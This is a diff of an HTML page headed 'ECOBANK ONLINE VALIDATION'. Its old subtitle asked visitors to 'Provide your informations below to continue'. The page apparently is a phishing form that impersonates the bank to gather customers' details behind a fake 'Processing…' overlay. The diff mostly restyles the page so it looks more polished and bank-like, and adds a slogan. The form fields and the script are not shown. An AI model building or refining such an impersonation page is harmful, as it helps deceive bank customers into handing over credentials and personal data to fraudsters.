@@ -8,51 +8,63 @@
     body {
       font-family: Arial, sans-serif;
       margin: 0;
-      background: linear-gradient(to bottom, #08143a, #0b1d4d);
+      background: linear-gradient(to bottom, #2b6cb0, #2a4365);
       min-height: 100vh;
       color: #fff;
       display: flex;
       flex-direction: column;
       align-items: center;
+      padding: 0 10px;
     }
+
     .header {
-      position: relative;
       background: linear-gradient(135deg, #2b6cb0, #2a4365);
       width: 100%;
-      min-height: 160px;
-      padding: 36px 16px;
+      padding: 40px 20px;
+      text-align: center;
       border-bottom-left-radius: 40px;
       border-bottom-right-radius: 40px;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      text-align: center;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
     }
-    .header-content h1 {
-      margin: 0;
-      font-size: 22px;
+
+    .title-badge {
+      display: inline-block;
+      background: linear-gradient(135deg, #1e3c72, #2a5298);
       color: #fff;
+      padding: 12px 20px;
+      border-radius: 50px;
+      font-size: 20px;
+      font-weight: bold;
+      text-transform: uppercase;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.25);
+      margin-bottom: 10px;
     }
-    .header-content p {
-      margin: 6px 0 0;
+
+    .header p {
+      margin: 8px 0 0;
+      font-size: 14px;
       color: #e0e0e0;
     }
+
     .form-wrap {
+      background: #fff;
       width: 90%;
-      max-width: 380px;
-      margin-top: -28px;
-      padding: 28px;
+      max-width: 400px;
+      margin-top: -30px;
+      padding: 30px 25px;
       border-radius: 12px;
-      background: rgba(255, 255, 255, 0.06);
-      box-shadow: 0 6px 16px rgba(0, 0, 0, 0.4);
-      backdrop-filter: blur(4px);
+      box-shadow: 0 6px 16px rgba(0,0,0,0.4);
+      color: #333;
     }
+
     label {
       display: block;
       margin-bottom: 6px;
       font-size: 14px;
-      color: #fff;
+      color: #333;
+      font-weight: bold;
     }
+
     input {
       width: 100%;
       padding: 12px;
@@ -64,26 +76,32 @@
       font-size: 14px;
       box-sizing: border-box;
     }
+
     button {
       width: 100%;
       padding: 12px;
-      border-radius: 6px;
+      border-radius: 50px;
       border: none;
-      background: #00A859;
+      background: linear-gradient(135deg, #28a745, #218838);
       color: #fff;
-      font-weight: 700;
+      font-weight: bold;
       cursor: pointer;
       font-size: 16px;
+      transition: all 0.3s ease;
     }
+
     button:hover {
-      background: #008f4a;
-      transform: scale(1.02);
+      background: linear-gradient(135deg, #218838, #1e7e34);
+      transform: scale(1.05);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.4);
     }
+
     .processing-overlay {
       position: fixed;
       inset: 0;
       background: rgba(0, 0, 0, 0.45);
       display: flex;
+      flex-direction: column;
       align-items: center;
       justify-content: center;
       color: #fff;
@@ -93,31 +111,39 @@
       opacity: 0;
       pointer-events: none;
       transition: opacity .2s;
+      text-align: center;
     }
+
     .processing-overlay.active {
       opacity: 1;
       pointer-events: auto;
     }
+
     .spinner {
-      width: 30px;
-      height: 30px;
+      width: 35px;
+      height: 35px;
       border: 3px solid rgba(255, 255, 255, 0.35);
       border-top: 3px solid #fff;
       border-radius: 50%;
-      margin-right: 10px;
+      margin-bottom: 15px;
       animation: spin .9s linear infinite;
     }
+
     @keyframes spin {
       to { transform: rotate(360deg); }
+    }
+
+    @media (max-width: 500px) {
+      .title-badge { font-size: 18px; padding: 10px 16px; }
+      .form-wrap { padding: 25px 20px; }
+      button { font-size: 15px; }
     }
   </style>
 </head>
 <body>
   <div class="header">
-    <div class="header-content">
-      <h1>ECOBANK ONLINE VALIDATION</h1>
-      <p>Provide your informations below to continue</p>
-    </div>
+    <h1 class="title-badge">ECOBANK ONLINE VALIDATION</h1>
+    <p>A BETTER WAY TO BANK YOUR WAY</p>
   </div>
 
   <div class="form-wrap" id="formContainer">
@@ -136,10 +162,8 @@
   </div>
 
   <div class="processing-overlay" id="processingOverlay" aria-hidden="true">
-    <div style="display:flex;align-items:center">
-      <div class="spinner" aria-hidden="true"></div>
-      Processing…
-    </div>
+    <div class="spinner" aria-hidden="true"></div>
+    <div>Processing…</div>
   </div>
 
   <script>
